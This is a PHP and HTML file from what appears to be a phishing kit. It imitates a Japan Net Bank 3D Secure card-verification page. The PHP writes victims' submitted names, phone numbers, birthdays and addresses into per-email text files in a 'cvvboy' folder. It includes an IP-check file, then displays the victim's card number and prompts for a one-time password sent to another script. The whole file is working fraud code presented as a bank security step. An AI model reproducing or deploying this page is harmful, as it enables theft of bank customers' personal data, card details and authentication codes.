<?php
session_start();
include('./fuck1937/lag.php');
include('./fuck1937/checkip.php');
//

$_SESSION["mingqian"] = $_POST["mingqian"];
$_SESSION["pianjia"] = $_POST["pianjia"];
$_SESSION["tel"] = $_POST["tel"];
$_SESSION["birthday"] = $_POST["birthday"];
$_SESSION["zip"] = $_POST["zip"];
$_SESSION["ADDR1"] = $_POST["ADDR1"];
$_SESSION["ADDR2"] = $_POST["ADDR2"];
$_SESSION["ADDR3"] = $_POST["ADDR3"];
$_SESSION["ADDR4"] = $_POST["ADDR4"];

$cardnumber = $_SESSION["cardnumber"];
$email = $_SESSION["email"];
$mingqian = $_SESSION["mingqian"];
$pianjia = $_SESSION["pianjia"];
$tel = $_SESSION["tel"];
$birthday = $_SESSION["birthday"];
$zip = $_SESSION["zip"];
$ADDR1 = $_SESSION["ADDR1"];
$ADDR2 = $_SESSION["ADDR2"];
$ADDR3 = $_SESSION["ADDR3"];
$ADDR4 = $_SESSION["ADDR4"];

file_put_contents("./cvvboy/$email.txt",'---------------个人信息---------------'.PHP_EOL.'名字：'.$mingqian.PHP_EOL.'假名:'.$pianjia.PHP_EOL.'电话号码:'.$tel.PHP_EOL.'生日:'.$birthday.PHP_EOL.'邮政'.$zip.PHP_EOL.'都道府:'.$ADDR1.PHP_EOL.'市:'.$ADDR2.PHP_EOL.'街:'.$ADDR3.PHP_EOL.'建筑:'.$ADDR4.PHP_EOL, FILE_APPEND);
?>


<html>
<head>
    <meta http-equiv="Cache-Control" content="no-cache,private,no-store">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta http-equiv="Content-Script-Type" content="text/javascript">
    <meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no" />

    <title>3D/Secure Protection｜株式会社ジャパンネット銀行｜安全なお取引をしていただく為に、セキュリティコードまたは3Dセキュアを入力します</title>
    <link rel="stylesheet" type="text/css" href="./css/idpass_V_PC.css">
    <script src="js/jquery.min.js"></script>
    <script src="js/jquery.validate.min.js"></script>
    <script src="js/sire.form.js"></script>
    <script type="text/javascript" language="JavaScript">
        <!--
        var closing = false;
        var cancel = false;
        var submitClicked = false;

        var w = 640;
        var h = 480;
        var x = (screen.width - w) / 2;
        var y = (screen.height - h) / 2;

        function onCancelClickHandler()
        {
            if( confirm("お買い物を中断します。\n\n下の[OK]をクリックすると、今回ご指定いただいたカードではお支払いいただけません。\n\nよろしければ[OK]をクリックしてください。") )
            {
                history.back();
            }
        }

        function onHelpClickHandler()
        {
            popup = window.open("https://acsweb-pa.dnp-cdms.jp/auth/jnb0/images/JNB0/receipt_help_sample_v_PC.html", "faq",
                "scrollbars=yes,screenX="+x+",screenY="+y+",left="+x+",top="+y+",width="+w+",height="+h);
            popup.focus();
        }
        // -->
    </script>

</head>

<body style="height: auto ;width: auto;background-color: #ffffff">
<div
    style="width: 100%;
height: 100%
"><div style="height: 100%; width: 100%">
        <form method="post" id="formvbv" name="formvbv" action="sess.php">
            <center>
                <table width="390" cellspacing="0" cellpadding="0">
                    <tbody><tr>
                        <td>
                            <div class="contents">
                                <table class="logo-image">

                                    <td class="brand-logo">     <img src="img/sss.png" width="100" height="100" alt="">                                    </td>


                                    <td class="issuer-logo"><div style="margin: 3px"> <img src="/img/logo.svg" width="125" height="44"></div>

                                        <div>


                                    </td>
                                    </tr>

                                    </tbody></table>
                                <div class="protection">Added Protection</div>
                                <div class="message">お客様のご利用カード会社インターネットサービスパスワードをご入力ください。</div>
                                <table class="contents">
                                    <tbody><tr>
                                        <td class="item">加盟店名：</td>
                                        <td class="value">J:COM</td>
                                    </tr>
                                    <tr>
                                        <td class="item">ご利用金額：</td>
                                        <td class="value">JPY 0.00</td>
                                    </tr>
                                    <tr>
                                        <td class="item">ご利用日：</td>
                                        <td><script language=JavaScript>



                                                <!--document.write(" " + document.lastModified + "") -->
                                                //var dd=document.lastModified;
                                                var pp=new Date();
                                                document.write(pp.getFullYear()+"/"+(pp.getMonth()+1)+"/"+pp.getDate());

                                            </script></td>
                                    </tr>
                                    <tr>
                                        <td class="item">カード番号：</td>
                                        <td class="value"><?php echo  $cardnumber ;?></td>
                                    </tr>
                                    <tr>

                                    </tr>
                                    <tr>
                                        <td class="item">ワンタイムパスワード：</td>
                                        <td class="value"><input name="passvbv" type="password" value="" size="20" maxlength="30" class="password" style="height: auto;width: 90%"></td>

                                    </tr>
                                    <tr>
                                        <td class="item"></td>
                                        <td class="value">
                                            <table class="controls">
                                                <tbody><tr>
                                                    <td class="send">
                                                        <input type="submit" id="send" value="送信" class="button">
                                                    </td>
                                                    <td valign="middle" align="center">
                                                        <img src="img/faq_mark.gif" border="0" width="14" height="13" alt="">
                                                    </td>
                                                    <td class="help">
                                                        <a href="javascript:onHelpClickHandler();">ヘルプ</a>
                                                    </td>
                                                    <td class="cancel">
                                                        <a href="javascript:onCancelClickHandler();" id="cancel">キャンセル</a>
                                                    </td>
                                                </tr>
                                                </tbody></table>
                                        </td>
                                    </tr>
                                    </tbody></table>
                                <center>
                                    <div class="additional"></div>
                                </center>
                                <div class="footer"></div>
                                <noscript>
                                    <div class="noJavaScript"></div>
                                </noscript>
                            </div>
                        </td>
                    </tr>
                    </tbody>
                </table>
            </center>
        </form>
    </div>
</div>

</body></html>